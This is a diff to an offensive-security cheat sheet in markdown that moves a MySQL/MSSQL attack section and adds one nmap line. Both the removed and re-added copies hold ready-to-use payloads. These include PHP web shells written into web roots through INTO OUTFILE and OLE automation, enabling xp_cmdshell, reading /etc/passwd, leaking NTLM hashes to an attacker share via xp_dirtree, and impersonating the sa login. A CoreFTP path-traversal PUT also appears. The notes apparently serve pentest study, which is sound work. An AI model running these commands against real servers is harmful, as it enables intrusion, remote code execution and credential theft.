@@ -13,10 +13,6 @@
     - [Schedule Tasks](#schedule-tasks)
     - [Logon as Trigger](#logon-as-trigger)
     - [Login Screen](#login-screen)
-    - [Web shell | mssql | mysql](#web-shell--mssql--mysql)
-      - [Queries](#queries)
-        - [MySQL](#mysql)
-        - [MSSQL](#mssql)
   - [Powershell](#powershell)
     - [Enumeration](#enumeration)
 - [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
@@ -39,6 +35,10 @@
   - [SMB - 445](#smb---445)
     - [SMBMAP](#smbmap)
   - [FTP - 32](#ftp---32)
+  - [mssql | mysql](#mssql--mysql)
+    - [Queries](#queries)
+      - [MySQL](#mysql)
+      - [MSSQL](#mssql)
   - [RDP](#rdp)
   - [DNS - 53](#dns---53)
   - [Email service](#email-service)
@@ -446,157 +446,6 @@ python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/D
 - Utilman (patched)
   - Ease access 
   - c:\Windows\System32\sethc.exe
-
-#### Web shell | mssql | mysql
-- web shell to web directory
-- default web server: iis apppool\defaultapppool
-- mssql: tcp:1443 | upd:1434
-- mysql: tco:3306 | tcp:2433
-
-- **sqsh**: shell database
-  - sqsh -S $TARGET -U user -p pass
-  - sqsh -S $TARGET -U .\\USER -P 'PASS' -h = domain
-- **impacket-mssqlclient**
-  - impacket-mssqlclient -p PORT user@$target
-- **mysql**
-  - mysql -h $TARGET -U user -pPass
-  - sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
-    - -y (SQLCMDMAXVARTYPEWIDTH) 
-    - -Y (SQLCMDMAXFIXEDTYPEWIDTH) 
-
-##### Queries
-
-###### MySQL
-```
-myslq: system db
-information_schema: db metadata
-performace_schema:  monitoring
-sys:                interperte performance schema
-```
-
-- Queries
-```
-Show Databases;
-Select name FROM master.dbo.sysdatabases
-USE db_name;
-SHOW TABLES;
-Select table_name FROM db_name.INFORMATION_SCHEMA.TABLES
-Select * from table_name;
-```
-
-- Commands
-```
-- xp_cmdshell
-xp_cmdshell 'COMMAND'
-```
-
-- Enable xp_cmdshell
-```
-EXECUTE sp_configure 'show advanced options', 1
-RECONFIGURE
-EXECUTE sp_configure 'xp_cmdshell', 1
-RECONFIGURE
-```
-
-- Write Files
-```
-SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-
-show variables like "secure_file_priv"; = read/write 
-```
-
-- Enable Ole Automation Procedures
-```
-sp_configure 'show advanced options', 1
-RECONFIGURE
-sp_configure 'Ole Automation Procedures', 1
-RECONFIGURE
-```
-
-- Read files
-
-```
-select LOAD_FILE("/etc/passwd");
-```
-
-###### MSSQL 
-```
-master:             info about instance
-msdb:               for SQL server agent
-model:              template
-resource:           read-only db
-tempdb:             temporary files
-```
-
-- [Queries](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/1-enumeration.md)
-
-- Create file
-```
-DECLARE @OLE INT
-DECLARE @FileID INT
-EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
-EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
-EXECUTE sp_OADestroy @FileID
-EXECUTE sp_OADestroy @OLE
-```
-
-- Read files
-```
-SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-```
-
-- Grab hash
-```
-# Start responder
-responder | smbserver share ./ -smb2support
-
-# xp_subdirs/xp_dirtree
-
-EXEC master..xp_dirtree '\\$ATTACKER\share\'
-EXEC master..xp_subdirs '\\$ATTACKER\share\'
-hashcat 5600 (NTLMv2)
-```
-
-- Impersonate
-1. Identify users
-
-```
-SELECT distinct b.name
-FROM sys.server_permissions a
-INNER JOIN sys.server_principals b
-a.grantor_principal_id = b.principal_id
-WHERE a.permission_name = 'IMPERSONATE'
-```
-
-2. Check current role
-```
-SELECT SYSTEM_USER
-SELECT IS_SRVROLEMEMBER('sysadmin')
-```
-
-3. Impersonate
-```
-EXECUTE AS LOGIN = 'sa'
-back to 2.
-
-# Revert
-REVERT
-
-
-- All users have access to master db
-* USE master
-```
-
-- External DBs
-4. show remotes
-  
-```
-SELECT srvname, isremote FROM sysservers
-EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-```
-
-- GUI: [dbeaver](https://github.com/dbeaver/dbeaver)
 
 ### Powershell
 - .NET framkework: software plattform für windows
@@ -1089,6 +938,7 @@ net use \\ATTACKER_IP\share /del
 - ftp $TARGET
   - mget | get
   - mput | put
+- nmap --script ftp-anon
 
 - Bounce attack: deliver outbound traffic to anotehr device
   - nmap -p 80 -b user:pass@$TARGET INTERNAL_IP
@@ -1097,6 +947,157 @@ net use \\ATTACKER_IP\share /del
 # CoreFTP attack
 curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
+
+### mssql | mysql
+- web shell to web directory
+- default web server: iis apppool\defaultapppool
+- mssql: tcp:1443 | upd:1434
+- mysql: tco:3306 | tcp:2433
+
+- **sqsh**: shell database
+  - sqsh -S $TARGET -U user -p pass
+  - sqsh -S $TARGET -U .\\USER -P 'PASS' -h = domain
+- **impacket-mssqlclient**
+  - impacket-mssqlclient -p PORT user@$target
+- **mysql**
+  - mysql -h $TARGET -U user -pPass
+  - sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+    - -y (SQLCMDMAXVARTYPEWIDTH) 
+    - -Y (SQLCMDMAXFIXEDTYPEWIDTH) 
+
+#### Queries
+
+##### MySQL
+```
+myslq: system db
+information_schema: db metadata
+performace_schema:  monitoring
+sys:                interperte performance schema
+```
+
+- Queries
+```
+Show Databases;
+Select name FROM master.dbo.sysdatabases
+USE db_name;
+SHOW TABLES;
+Select table_name FROM db_name.INFORMATION_SCHEMA.TABLES
+Select * from table_name;
+```
+
+- Commands
+```
+- xp_cmdshell
+xp_cmdshell 'COMMAND'
+```
+
+- Enable xp_cmdshell
+```
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+```
+
+- Write Files
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+show variables like "secure_file_priv"; = read/write 
+```
+
+- Enable Ole Automation Procedures
+```
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+```
+
+- Read files
+
+```
+select LOAD_FILE("/etc/passwd");
+```
+
+##### MSSQL 
+```
+master:             info about instance
+msdb:               for SQL server agent
+model:              template
+resource:           read-only db
+tempdb:             temporary files
+```
+
+- [Queries](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/1-enumeration.md)
+
+- Create file
+```
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+```
+
+- Read files
+```
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
+
+- Grab hash
+```
+# Start responder
+responder | smbserver share ./ -smb2support
+
+# xp_subdirs/xp_dirtree
+
+EXEC master..xp_dirtree '\\$ATTACKER\share\'
+EXEC master..xp_subdirs '\\$ATTACKER\share\'
+hashcat 5600 (NTLMv2)
+```
+
+- Impersonate
+1. Identify users
+
+```
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+
+2. Check current role
+```
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+
+3. Impersonate
+```
+EXECUTE AS LOGIN = 'sa'
+back to 2.
+
+# Revert
+REVERT
+
+
+- All users have access to master db
+* USE master
+```
+
+- External DBs
+4. show remotes
+  
+```
+SELECT srvname, isremote FROM sysservers
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+```
+
+- GUI: [dbeaver](https://github.com/dbeaver/dbeaver)
 
 ### RDP
 - TCP:3389
